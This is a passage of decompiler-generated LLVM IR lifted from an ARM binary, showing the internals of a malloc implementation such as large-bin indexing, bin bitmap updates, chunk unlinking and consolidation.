  %v0_12820 = load i32, i32* %ip.global-to-local, align 4
  %v1_12820 = load i32, i32* %r1.global-to-local, align 4
  %v2_12820 = add i32 %v1_12820, 8
  %v3_12820 = inttoptr i32 %v2_12820 to i32*
  store i32 %v0_12820, i32* %v3_12820, align 4
  %v0_12824 = load i32, i32* %r1.global-to-local, align 4
  %v1_12824 = load i32, i32* %ip.global-to-local, align 4
  %v2_12824 = add i32 %v1_12824, 12
  %v3_12824 = inttoptr i32 %v2_12824 to i32*
  store i32 %v0_12824, i32* %v3_12824, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_1282c:                               ; preds = %dec_label_pc_127dc
  store i32 %v0_127b4, i32* %r0.global-to-local, align 4
  %v1_12830 = call i32 @__malloc_largebin_index(i32 %v0_127b4)
  store i32 %v1_12830, i32* %r0.global-to-local, align 4
  %v0_12834 = load i32, i32* @r4, align 4
  %v1_12834 = and i32 %v0_12834, 2
  %v2_12834 = icmp eq i32 %v1_12834, 0
  store i32 %v1_12830, i32* @r7, align 4
  br i1 %v2_12834, label %dec_label_pc_1298c, label %dec_label_pc_12840

dec_label_pc_12840:                               ; preds = %dec_label_pc_1282c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_12848 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12848, i32* @r0, align 4
  %v0_1284c = call i32 @__malloc_consolidate()
  store i32 %v0_1284c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1298c

dec_label_pc_12854:                               ; preds = %dec_label_pc_129a0
  %v1_12854 = add i32 %v3_129a0, 4
  %v2_12854 = inttoptr i32 %v1_12854 to i32*
  %v3_12854 = load i32, i32* %v2_12854, align 4
  store i32 %v3_12854, i32* %r3.global-to-local, align 4
  %v0_12858 = load i32, i32* @sl, align 4
  %v1_1285c = and i32 %v3_12854, -4
  store i32 %v1_1285c, i32* %r4.global-to-local, align 4
  %v1_12860 = add i32 %v3_129a0, 12
  %v2_12860 = inttoptr i32 %v1_12860 to i32*
  %v3_12860 = load i32, i32* %v2_12860, align 4
  store i32 %v3_12860, i32* %ip.global-to-local, align 4
  %tmp204 = icmp ugt i32 %v0_12858, 255
  br i1 %tmp204, label %dec_label_pc_128bc, label %dec_label_pc_12868

dec_label_pc_12868:                               ; preds = %dec_label_pc_12854
  %v9_12868 = icmp eq i32 %v3_12860, %v0_128c0
  br i1 %v9_12868, label %dec_label_pc_12870, label %dec_label_pc_128bc

dec_label_pc_12870:                               ; preds = %dec_label_pc_12868
  %v0_12870 = load i32, i32* @sb, align 4
  %v1_12870 = add i32 %v0_12870, 48
  %v2_12870 = inttoptr i32 %v1_12870 to i32*
  %v3_12870 = load i32, i32* %v2_12870, align 4
  store i32 %v3_12870, i32* %r3.global-to-local, align 4
  %v9_12874 = icmp eq i32 %v3_129a0, %v3_12870
  br i1 %v9_12874, label %dec_label_pc_1287c, label %dec_label_pc_128bc

dec_label_pc_1287c:                               ; preds = %dec_label_pc_12870
  %v1_1287c = load i32, i32* @fp, align 4
  %tmp205 = icmp ugt i32 %v1_1285c, %v1_1287c
  br i1 %tmp205, label %dec_label_pc_12884, label %dec_label_pc_128bc

dec_label_pc_12884:                               ; preds = %dec_label_pc_1287c
  %v2_12884 = sub i32 %v1_1285c, %v0_12858
  store i32 %v2_12884, i32* %r2.global-to-local, align 4
  %v2_12888 = add i32 %v0_12858, %v3_129a0
  store i32 %v2_12888, i32* %r3.global-to-local, align 4
  %v1_1288c = or i32 %v0_12858, 1
  store i32 %v1_1288c, i32* %r0.global-to-local, align 4
  %v1_12890 = or i32 %v2_12884, 1
  store i32 %v1_12890, i32* %r1.global-to-local, align 4
  %v1_12894 = add i32 %v3_129a0, 8
  store i32 %v1_12894, i32* %r4.global-to-local, align 4
  %v2_12898 = add i32 %v0_128c0, 8
  %v3_12898 = inttoptr i32 %v2_12898 to i32*
  store i32 %v2_12888, i32* %v3_12898, align 4
  %v0_1289c = load i32, i32* %r3.global-to-local, align 4
  %v1_1289c = load i32, i32* %ip.global-to-local, align 4
  %v2_1289c = add i32 %v1_1289c, 12
  %v3_1289c = inttoptr i32 %v2_1289c to i32*
  store i32 %v0_1289c, i32* %v3_1289c, align 4
  %v0_128a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_128a0 = load i32, i32* @r6, align 4
  %v2_128a0 = add i32 %v1_128a0, 4
  %v3_128a0 = inttoptr i32 %v2_128a0 to i32*
  store i32 %v0_128a0, i32* %v3_128a0, align 4
  %v0_128a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_128a4 = load i32, i32* @sb, align 4
  %v2_128a4 = add i32 %v1_128a4, 48
  %v3_128a4 = inttoptr i32 %v2_128a4 to i32*
  store i32 %v0_128a4, i32* %v3_128a4, align 4
  %v0_128a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_128a8 = load i32, i32* %r3.global-to-local, align 4
  %v3_128a8 = add i32 %v1_128a8, %v0_128a8
  %v4_128a8 = inttoptr i32 %v3_128a8 to i32*
  store i32 %v0_128a8, i32* %v4_128a8, align 4
  %v0_128ac = load i32, i32* %r1.global-to-local, align 4
  %v1_128ac = load i32, i32* %r3.global-to-local, align 4
  %v2_128ac = add i32 %v1_128ac, 4
  %v3_128ac = inttoptr i32 %v2_128ac to i32*
  store i32 %v0_128ac, i32* %v3_128ac, align 4
  %v0_128b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_128b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_128b0 = add i32 %v1_128b0, 12
  %v3_128b0 = inttoptr i32 %v2_128b0 to i32*
  store i32 %v0_128b0, i32* %v3_128b0, align 4
  %v0_128b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_128b4 = load i32, i32* %r3.global-to-local, align 4
  %v2_128b4 = add i32 %v1_128b4, 8
  %v3_128b4 = inttoptr i32 %v2_128b4 to i32*
  store i32 %v0_128b4, i32* %v3_128b4, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_128bc:                               ; preds = %dec_label_pc_1287c, %dec_label_pc_12870, %dec_label_pc_12868, %dec_label_pc_12854
  %v9_128bc = icmp eq i32 %v1_1285c, %v0_12858
  %v2_128c0 = add i32 %v3_12860, 8
  %v3_128c0 = inttoptr i32 %v2_128c0 to i32*
  store i32 %v0_128c0, i32* %v3_128c0, align 4
  %v0_128c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_128c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_128c4 = add i32 %v1_128c4, 12
  %v3_128c4 = inttoptr i32 %v2_128c4 to i32*
  store i32 %v0_128c4, i32* %v3_128c4, align 4
  br i1 %v9_128bc, label %dec_label_pc_12a1c.loopexit, label %dec_label_pc_128d8

dec_label_pc_128d8:                               ; preds = %dec_label_pc_128bc
  %v0_128d8 = load i32, i32* %r4.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_128d8, 255
  br i1 %tmp206, label %dec_label_pc_128fc, label %dec_label_pc_128e0

dec_label_pc_128e0:                               ; preds = %dec_label_pc_128d8
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r2.global-to-local, align 4
  %v1_128e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_128e4 = add i32 %v1_128e4, sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32)
  %v3_128e4 = inttoptr i32 %v2_128e4 to i32*
  %v4_128e4 = load i32, i32* %v3_128e4, align 4
  %v3_128e8 = udiv i32 %v0_128d8, 8
  store i32 %v3_128e8, i32* %r0.global-to-local, align 4
  %v4_128ec = mul nuw i32 %v3_128e8, 8
  %v5_128ec = add i32 %v4_128e4, %v4_128ec
  store i32 %v5_128ec, i32* %r3.global-to-local, align 4
  %v1_128f0 = add i32 %v5_128ec, 44
  store i32 %v1_128f0, i32* %ip.global-to-local, align 4
  %v1_128f4 = add i32 %v5_128ec, 52
  %v2_128f4 = inttoptr i32 %v1_128f4 to i32*
  %v3_128f4 = load i32, i32* %v2_128f4, align 4
  store i32 %v3_128f4, i32* @lr, align 4
  br label %dec_label_pc_12954

dec_label_pc_128fc:                               ; preds = %dec_label_pc_128d8
  store i32 %v0_128d8, i32* %r0.global-to-local, align 4
  %v1_12900 = call i32 @__malloc_largebin_index(i32 %v0_128d8)
  store i32 %v1_12900, i32* %r0.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %ip.global-to-local, align 4
  %v1_12908 = load i32, i32* %r8.global-to-local, align 4
  %v2_12908 = add i32 %v1_12908, sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32)
  %v3_12908 = inttoptr i32 %v2_12908 to i32*
  %v4_12908 = load i32, i32* %v3_12908, align 4
  %v4_1290c = mul i32 %v1_12900, 8
  %v5_1290c = add i32 %v4_12908, %v4_1290c
  store i32 %v5_1290c, i32* %r3.global-to-local, align 4
  %v1_12910 = add i32 %v5_1290c, 44
  store i32 %v1_12910, i32* %ip.global-to-local, align 4
  %v1_12914 = add i32 %v5_1290c, 52
  %v2_12914 = inttoptr i32 %v1_12914 to i32*
  %v3_12914 = load i32, i32* %v2_12914, align 4
  store i32 %v3_12914, i32* @lr, align 4
  %v9_12918 = icmp eq i32 %v3_12914, %v1_12910
  br i1 %v9_12918, label %dec_label_pc_12954, label %dec_label_pc_12920

dec_label_pc_12920:                               ; preds = %dec_label_pc_128fc
  %v1_12920 = add i32 %v5_1290c, 56
  %v2_12920 = inttoptr i32 %v1_12920 to i32*
  %v3_12920 = load i32, i32* %v2_12920, align 4
  store i32 %v3_12920, i32* %r1.global-to-local, align 4
  %v1_12924 = add i32 %v3_12920, 4
  %v2_12924 = inttoptr i32 %v1_12924 to i32*
  %v3_12924 = load i32, i32* %v2_12924, align 4
  store i32 %v3_12924, i32* %r3.global-to-local, align 4
  %v0_12928 = load i32, i32* %r4.global-to-local, align 4
  %v3_12928 = icmp ult i32 %v0_12928, %v3_12924
  br i1 %v3_12928, label %.thread, label %dec_label_pc_12944.preheader

.thread:                                          ; preds = %dec_label_pc_12920
  store i32 %v1_12910, i32* @lr, align 4
  store i32 %v3_12920, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12954

dec_label_pc_12944.preheader:                     ; preds = %dec_label_pc_12920
  %v2_12930 = or i32 %v0_12928, 1
  store i32 %v2_12930, i32* %r2.global-to-local, align 4
  %v1_12944180 = add i32 %v3_12914, 4
  %v2_12944181 = inttoptr i32 %v1_12944180 to i32*
  %v3_12944182 = load i32, i32* %v2_12944181, align 4
  store i32 %v3_12944182, i32* %r3.global-to-local, align 4
  %v3_12948184 = icmp ult i32 %v2_12930, %v3_12944182
  br i1 %v3_12948184, label %dec_label_pc_12940, label %dec_label_pc_12950

dec_label_pc_12940:                               ; preds = %dec_label_pc_12944.preheader, %dec_label_pc_12940
  %v0_12950185 = phi i32 [ %v3_12940, %dec_label_pc_12940 ], [ %v3_12914, %dec_label_pc_12944.preheader ]
  %v1_12940 = add i32 %v0_12950185, 8
  %v2_12940 = inttoptr i32 %v1_12940 to i32*
  %v3_12940 = load i32, i32* %v2_12940, align 4
  store i32 %v3_12940, i32* @lr, align 4
  %v1_12944 = add i32 %v3_12940, 4
  %v2_12944 = inttoptr i32 %v1_12944 to i32*
  %v3_12944 = load i32, i32* %v2_12944, align 4
  store i32 %v3_12944, i32* %r3.global-to-local, align 4
  %v3_12948 = icmp ult i32 %v2_12930, %v3_12944
  br i1 %v3_12948, label %dec_label_pc_12940, label %dec_label_pc_12950

dec_label_pc_12950:                               ; preds = %dec_label_pc_12940, %dec_label_pc_12944.preheader
  %v0_12950.lcssa = phi i32 [ %v3_12914, %dec_label_pc_12944.preheader ], [ %v3_12940, %dec_label_pc_12940 ]
  %v1_12950 = add i32 %v0_12950.lcssa, 12
  %v2_12950 = inttoptr i32 %v1_12950 to i32*
  %v3_12950 = load i32, i32* %v2_12950, align 4
  store i32 %v3_12950, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12954

dec_label_pc_12954:                               ; preds = %.thread, %dec_label_pc_128fc, %dec_label_pc_128e0, %dec_label_pc_12950
  %v0_12974 = phi i32 [ %v1_12910, %dec_label_pc_128fc ], [ %v1_128f0, %dec_label_pc_128e0 ], [ %v3_12950, %dec_label_pc_12950 ], [ %v3_12920, %.thread ]
  %v0_12968 = phi i32 [ %v1_12900, %dec_label_pc_128fc ], [ %v3_128e8, %dec_label_pc_128e0 ], [ %v1_12900, %dec_label_pc_12950 ], [ %v1_12900, %.thread ]
  %v1_12958 = phi i32 [ %v1_12908, %dec_label_pc_128fc ], [ %v1_128e4, %dec_label_pc_128e0 ], [ %v1_12908, %dec_label_pc_12950 ], [ %v1_12908, %.thread ]
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r2.global-to-local, align 4
  %v2_12958 = add i32 %v1_12958, sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32)
  %v3_12958 = inttoptr i32 %v2_12958 to i32*
  %v4_12958 = load i32, i32* %v3_12958, align 4
  %v3_1295c = sdiv i32 %v0_12968, 32
  store i32 %v3_1295c, i32* %r3.global-to-local, align 4
  %v4_12960 = mul nsw i32 %v3_1295c, 4
  %v5_12960 = add i32 %v4_12958, %v4_12960
  store i32 %v5_12960, i32* %r1.global-to-local, align 4
  %v1_12964 = add i32 %v5_12960, 820
  %v2_12964 = inttoptr i32 %v1_12964 to i32*
  %v3_12964 = load i32, i32* %v2_12964, align 4
  %v1_12968 = urem i32 %v0_12968, 32
  store i32 %v1_12968, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_12970 = shl i32 1, %v1_12968
  %v8_12970 = or i32 %v3_12964, %v7_12970
  store i32 %v8_12970, i32* %r3.global-to-local, align 4
  %v1_12974 = load i32, i32* @r6, align 4
  %v2_12974 = add i32 %v1_12974, 12
  %v3_12974 = inttoptr i32 %v2_12974 to i32*
  store i32 %v0_12974, i32* %v3_12974, align 4
  %v0_12978 = load i32, i32* @lr, align 4
  %v1_12978 = load i32, i32* @r6, align 4
  %v2_12978 = add i32 %v1_12978, 8
  %v3_12978 = inttoptr i32 %v2_12978 to i32*
  store i32 %v0_12978, i32* %v3_12978, align 4
  %v0_1297c = load i32, i32* %r3.global-to-local, align 4
  %v1_1297c = load i32, i32* %r1.global-to-local, align 4
  %v2_1297c = add i32 %v1_1297c, 820
  %v3_1297c = inttoptr i32 %v2_1297c to i32*
  store i32 %v0_1297c, i32* %v3_1297c, align 4
  %v0_12980 = load i32, i32* @r6, align 4
  %v1_12980 = load i32, i32* @lr, align 4
  %v2_12980 = add i32 %v1_12980, 12
  %v3_12980 = inttoptr i32 %v2_12980 to i32*
  store i32 %v0_12980, i32* %v3_12980, align 4
  %v0_12984 = load i32, i32* @r6, align 4
  %v1_12984 = load i32, i32* %ip.global-to-local, align 4
  %v2_12984 = add i32 %v1_12984, 8
  %v3_12984 = inttoptr i32 %v2_12984 to i32*
  store i32 %v0_12984, i32* %v3_12984, align 4
  %v0_129a0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_129a0

dec_label_pc_1298c:                               ; preds = %dec_label_pc_1282c, %dec_label_pc_127e4, %dec_label_pc_12840
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r1.global-to-local, align 4
  %v4_12994 = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12994, i32* @sb, align 4
  %v0_12998 = load i32, i32* @sl, align 4
  %v1_12998 = add i32 %v0_12998, 16
  store i32 %v1_12998, i32* @fp, align 4
  %v1_1299c = add i32 %v4_12994, 52
  store i32 %v1_1299c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %dec_label_pc_12954, %dec_label_pc_1298c
  %v0_128c0 = phi i32 [ %v0_129a0.pre, %dec_label_pc_12954 ], [ %v1_1299c, %dec_label_pc_1298c ]
  %v1_129a0 = add i32 %v0_128c0, 12
  %v2_129a0 = inttoptr i32 %v1_129a0 to i32*
  %v3_129a0 = load i32, i32* %v2_129a0, align 4
  store i32 %v3_129a0, i32* @r6, align 4
  %v9_129a4 = icmp eq i32 %v3_129a0, %v0_128c0
  br i1 %v9_129a4, label %dec_label_pc_129ac, label %dec_label_pc_12854

dec_label_pc_129ac:                               ; preds = %dec_label_pc_129a0
  %v0_129ac = load i32, i32* @sl, align 4
  %tmp207 = icmp ult i32 %v0_129ac, 256
  %v0_12a64.pre = load i32, i32* @r7, align 4
  br i1 %tmp207, label %dec_label_pc_129ac.dec_label_pc_12a64_crit_edge, label %dec_label_pc_129b4

dec_label_pc_129ac.dec_label_pc_12a64_crit_edge:  ; preds = %dec_label_pc_129ac
  %.pre201 = mul i32 %v0_12a64.pre, 8
  br label %dec_label_pc_12a64

dec_label_pc_129b4:                               ; preds = %dec_label_pc_129ac
  %v4_129b4 = mul i32 %v0_12a64.pre, 8
  %v5_129b4 = add i32 %v4_129b4, %v0_128c0
  store i32 %v5_129b4, i32* %r3.global-to-local, align 4
  %v1_129b8 = add i32 %v5_129b4, -8
  store i32 %v1_129b8, i32* %r1.global-to-local, align 4
  %v1_129bc = add i32 %v5_129b4, 4
  %v2_129bc = inttoptr i32 %v1_129bc to i32*
  %storemerge.pre = load i32, i32* %v2_129bc, align 4
  br label %dec_label_pc_12a5c

dec_label_pc_129c4:                               ; preds = %dec_label_pc_12a5c
  %v1_129c4 = add i32 %v1_129ec, 4
  %v2_129c4 = inttoptr i32 %v1_129c4 to i32*
  %v3_129c4 = load i32, i32* %v2_129c4, align 4
  store i32 %v3_129c4, i32* %r3.global-to-local, align 4
  %v1_129c8 = and i32 %v3_129c4, -4
  store i32 %v1_129c8, i32* %r2.global-to-local, align 4
  %v3_129cc = icmp ult i32 %v1_129c8, %v0_129ac
  %v1_129d0 = add i32 %v1_129ec, 12
  %v2_129d0 = inttoptr i32 %v1_129d0 to i32*
  %v3_129d0 = load i32, i32* %v2_129d0, align 4
  store i32 %v3_129d0, i32* %r0.global-to-local, align 4
  br i1 %v3_129cc, label %dec_label_pc_12a5c, label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129c4
  %v1_129d8 = add i32 %v1_129ec, 8
  %v2_129d8 = inttoptr i32 %v1_129d8 to i32*
  %v3_129d8 = load i32, i32* %v2_129d8, align 4
  store i32 %v3_129d8, i32* %r1.global-to-local, align 4
  %v1_129dc = add i32 %v3_129d8, 12
  %v2_129dc = inttoptr i32 %v1_129dc to i32*
  %v3_129dc = load i32, i32* %v2_129dc, align 4
  store i32 %v3_129dc, i32* %r3.global-to-local, align 4
  %v9_129e0 = icmp eq i32 %v3_129dc, %v1_129ec
  br i1 %v9_129e0, label %dec_label_pc_129e8, label %dec_label_pc_129f4

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129d8
  %v1_129e8 = add i32 %v3_129d0, 8
  %v2_129e8 = inttoptr i32 %v1_129e8 to i32*
  %v3_129e8 = load i32, i32* %v2_129e8, align 4
  store i32 %v3_129e8, i32* %r3.global-to-local, align 4
  %v9_129ec = icmp eq i32 %v3_129e8, %v1_129ec
  br i1 %v9_129ec, label %dec_label_pc_129f8, label %dec_label_pc_129f4

dec_label_pc_129f4:                               ; preds = %dec_label_pc_129d8, %dec_label_pc_129e8
  %v0_129f4 = call i32 @abort()
  store i32 %v0_129f4, i32* %r0.global-to-local, align 4
  %v0_129f8.pre = load i32, i32* @sl, align 4
  %v1_129f8.pre = load i32, i32* @r2, align 4
  %v0_12a00.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_129f8

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129e8, %dec_label_pc_129f4
  %v1_12a00 = phi i32 [ %v3_129d0, %dec_label_pc_129e8 ], [ %v0_129f4, %dec_label_pc_129f4 ]
  %v0_12a00 = phi i32 [ %v3_129d8, %dec_label_pc_129e8 ], [ %v0_12a00.pre, %dec_label_pc_129f4 ]
  %v1_129f8 = phi i32 [ %v1_129c8, %dec_label_pc_129e8 ], [ %v1_129f8.pre, %dec_label_pc_129f4 ]
  %v0_129f8 = phi i32 [ %v0_129ac, %dec_label_pc_129e8 ], [ %v0_129f8.pre, %dec_label_pc_129f4 ]
  %v2_129f8 = sub i32 %v1_129f8, %v0_129f8
  store i32 %v2_129f8, i32* %lr.global-to-local, align 4
  %v2_12a00 = add i32 %v1_12a00, 8
  %v3_12a00 = inttoptr i32 %v2_12a00 to i32*
  store i32 %v0_12a00, i32* %v3_12a00, align 4
  %v0_12a04 = load i32, i32* %r0.global-to-local, align 4
  %v1_12a04 = load i32, i32* %r1.global-to-local, align 4
  %v2_12a04 = add i32 %v1_12a04, 12
  %v3_12a04 = inttoptr i32 %v2_12a04 to i32*
  store i32 %v0_12a04, i32* %v3_12a04, align 4
  %v0_12a08 = load i32, i32* %ip.global-to-local, align 4
  %v1_12a08 = add i32 %v0_12a08, 8
  store i32 %v1_12a08, i32* %r0.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v2_129f8, 15
  br i1 %tmp208, label %dec_label_pc_12a28, label %dec_label_pc_12a10

dec_label_pc_12a10:                               ; preds = %dec_label_pc_129f8
  %v1_12a10 = load i32, i32* %r2.global-to-local, align 4
  %v2_12a10 = add i32 %v1_12a10, %v0_12a08
  store i32 %v2_12a10, i32* %r2.global-to-local, align 4
  %v1_12a14 = add i32 %v2_12a10, 4
  %v2_12a14 = inttoptr i32 %v1_12a14 to i32*
  %v3_12a14 = load i32, i32* %v2_12a14, align 4
  store i32 %v3_12a14, i32* %r3.global-to-local, align 4
  store i32 %v1_12a08, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_12a1c.loopexit:                      ; preds = %dec_label_pc_128bc
  %v1_128c8 = load i32, i32* @r6, align 4
  %v2_128c8 = load i32, i32* @sl, align 4
  %v3_128c8 = add i32 %v2_128c8, %v1_128c8
  store i32 %v3_128c8, i32* %r2.global-to-local, align 4
  %v2_128cc = add i32 %v3_128c8, 4
  %v3_128cc = inttoptr i32 %v2_128cc to i32*
  %v4_128cc = load i32, i32* %v3_128cc, align 4
  store i32 %v4_128cc, i32* %r3.global-to-local, align 4
  %v2_128d0 = add i32 %v1_128c8, 8
  store i32 %v2_128d0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a1c

dec_label_pc_12a1c:                               ; preds = %.dec_label_pc_12a1c_crit_edge, %dec_label_pc_12a1c.loopexit, %dec_label_pc_12a10
  %v1_12a20 = phi i32 [ %v4_12b44, %.dec_label_pc_12a1c_crit_edge ], [ %v3_128c8, %dec_label_pc_12a1c.loopexit ], [ %v2_12a10, %dec_label_pc_12a10 ]
  %v0_12a1c = phi i32 [ %v7_12b44, %.dec_label_pc_12a1c_crit_edge ], [ %v4_128cc, %dec_label_pc_12a1c.loopexit ], [ %v3_12a14, %dec_label_pc_12a10 ]
  %v1_12a1c = or i32 %v0_12a1c, 1
  store i32 %v1_12a1c, i32* %r3.global-to-local, align 4
  %v2_12a20 = add i32 %v1_12a20, 4
  %v3_12a20 = inttoptr i32 %v2_12a20 to i32*
  store i32 %v1_12a1c, i32* %v3_12a20, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_12a28:                               ; preds = %dec_label_pc_129f8
  %v1_12a28 = load i32, i32* @sl, align 4
  %v2_12a28 = add i32 %v1_12a28, %v0_12a08
  store i32 %v2_12a28, i32* %r2.global-to-local, align 4
  %v1_12a2c = or i32 %v1_12a28, 1
  store i32 %v1_12a2c, i32* %r3.global-to-local, align 4
  %v0_12a30 = load i32, i32* %lr.global-to-local, align 4
  %v1_12a30 = or i32 %v0_12a30, 1
  store i32 %v1_12a30, i32* %r1.global-to-local, align 4
  store i32 %v1_12a08, i32* %r4.global-to-local, align 4
  %v2_12a38 = add i32 %v0_12a08, 4
  %v3_12a38 = inttoptr i32 %v2_12a38 to i32*
  store i32 %v1_12a2c, i32* %v3_12a38, align 4
  %v0_12a3c = load i32, i32* %r2.global-to-local, align 4
  %v1_12a3c = load i32, i32* @r6, align 4
  %v2_12a3c = add i32 %v1_12a3c, 8
  %v3_12a3c = inttoptr i32 %v2_12a3c to i32*
  store i32 %v0_12a3c, i32* %v3_12a3c, align 4
  %v0_12a40 = load i32, i32* %r2.global-to-local, align 4
  %v1_12a40 = load i32, i32* @r6, align 4
  %v2_12a40 = add i32 %v1_12a40, 12
  %v3_12a40 = inttoptr i32 %v2_12a40 to i32*
  store i32 %v0_12a40, i32* %v3_12a40, align 4
  %v0_12a44 = load i32, i32* %lr.global-to-local, align 4
  %v1_12a44 = load i32, i32* %r2.global-to-local, align 4
  %v3_12a44 = add i32 %v1_12a44, %v0_12a44
  %v4_12a44 = inttoptr i32 %v3_12a44 to i32*
  store i32 %v0_12a44, i32* %v4_12a44, align 4
  %v0_12a48 = load i32, i32* %r1.global-to-local, align 4
  %v1_12a48 = load i32, i32* %r2.global-to-local, align 4
  %v2_12a48 = add i32 %v1_12a48, 4
  %v3_12a48 = inttoptr i32 %v2_12a48 to i32*
  store i32 %v0_12a48, i32* %v3_12a48, align 4
  %v0_12a4c = load i32, i32* @r6, align 4
  %v1_12a4c = load i32, i32* %r2.global-to-local, align 4
  %v2_12a4c = add i32 %v1_12a4c, 12
  %v3_12a4c = inttoptr i32 %v2_12a4c to i32*
  store i32 %v0_12a4c, i32* %v3_12a4c, align 4
  %v0_12a50 = load i32, i32* @r6, align 4
  %v1_12a50 = load i32, i32* %r2.global-to-local, align 4
  %v2_12a50 = add i32 %v1_12a50, 8
  %v3_12a50 = inttoptr i32 %v2_12a50 to i32*
  store i32 %v0_12a50, i32* %v3_12a50, align 4
  br label %dec_label_pc_12fdc

dec_label_pc_12a5c:                               ; preds = %dec_label_pc_129c4, %dec_label_pc_129b4
  %v1_129ec = phi i32 [ %storemerge.pre, %dec_label_pc_129b4 ], [ %v3_129d0, %dec_label_pc_129c4 ]
  store i32 %v1_129ec, i32* %ip.global-to-local, align 4
  %v9_12a5c = icmp eq i32 %v1_129ec, %v1_129b8
  br i1 %v9_12a5c, label %dec_label_pc_12a64.loopexit, label %dec_label_pc_129c4

dec_label_pc_12a64.loopexit:                      ; preds = %dec_label_pc_12a5c
  br label %dec_label_pc_12a64

dec_label_pc_12a64:                               ; preds = %dec_label_pc_129ac.dec_label_pc_12a64_crit_edge, %dec_label_pc_12a64.loopexit
  %v4_12a94.pre-phi = phi i32 [ %.pre201, %dec_label_pc_129ac.dec_label_pc_12a64_crit_edge ], [ %v4_129b4, %dec_label_pc_12a64.loopexit ]
  %v1_12a64 = add i32 %v0_12a64.pre, 1
  store i32 %v1_12a64, i32* %r2.global-to-local, align 4
  %v1_12a68 = urem i32 %v1_12a64, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r0.global-to-local, align 4
  %v6_12a74 = shl i32 1, %v1_12a68
  store i32 %v6_12a74, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_12a7c = load i32, i32* inttoptr (i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 32) to i32*), align 4
  store i32 %v4_12a7c, i32* %r3.global-to-local, align 4
  %v3_12a80 = udiv i32 %v1_12a64, 32
  store i32 %v3_12a80, i32* @r5, align 4
  %v4_12a84 = mul nuw nsw i32 %v3_12a80, 4
  %v5_12a84 = add i32 %v4_12a7c, %v4_12a84
  store i32 %v5_12a84, i32* %r2.global-to-local, align 4
  %v1_12a88 = add i32 %v5_12a84, 820
  %v2_12a88 = inttoptr i32 %v1_12a88 to i32*
  %v3_12a88 = load i32, i32* %v2_12a88, align 4
  store i32 %v3_12a88, i32* @r4, align 4
  %v1_12a8c = add i32 %v4_12a7c, 52
  store i32 %v1_12a8c, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_12a94 = add i32 %v1_12a8c, %v4_12a94.pre-phi
  store i32 %v5_12a94, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12a98

dec_label_pc_12a98:                               ; preds = %dec_label_pc_12b00, %dec_label_pc_12a64
  %v1_12aa0 = phi i32 [ %v1_12aa0.pre, %dec_label_pc_12b00 ], [ %v3_12a88, %dec_label_pc_12a64 ]
  %v0_12aa0 = phi i32 [ %v0_12a98.pre, %dec_label_pc_12b00 ], [ %v6_12a74, %dec_label_pc_12a64 ]
  %v1_12a98 = sub i32 1, %v0_12aa0
  %v2_12a98 = icmp ult i32 %v0_12aa0, 2
  %v1_12a98. = select i1 %v2_12a98, i32 %v1_12a98, i32 0
  store i32 %v1_12a98., i32* %r3.global-to-local, align 4
  %tmp142 = icmp ugt i32 %v0_12aa0, %v1_12aa0
  br i1 %tmp142, label %.thread13, label %bb143

.thread13:                                        ; preds = %dec_label_pc_12a98
  %v5_12aa4 = or i32 %v1_12a98., 1
  store i32 %v5_12aa4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12ab0.preheader

bb143:                                            ; preds = %dec_label_pc_12a98
  %v2_12aa8 = icmp eq i32 %v1_12a98., 0
  br i1 %v2_12aa8, label %.dec_label_pc_12aec.preheader_crit_edge, label %dec_label_pc_12ab0.preheader

.dec_label_pc_12aec.preheader_crit_edge:          ; preds = %bb143
  %v0_12ae455.pre = load i32, i32* %r0.global-to-local, align 4
